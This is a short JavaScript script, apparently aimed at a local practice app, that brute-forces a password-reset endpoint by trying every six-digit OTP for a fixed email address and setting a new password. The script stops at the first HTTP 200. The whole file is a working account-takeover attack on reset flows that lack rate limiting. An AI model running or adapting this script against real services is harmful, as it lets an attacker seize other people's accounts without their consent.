async function main(params) {
    
    for (let index = 100000; index < 999999; index++) {
        const responce = await fetch("http://localhost:3000/reset-password", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: "shiva@gmail.com",
                otp: `${index}`,
                newPassword: "gg"
            })
        })
        if(responce.status == 200){
            break
        }
        
    }
}
main()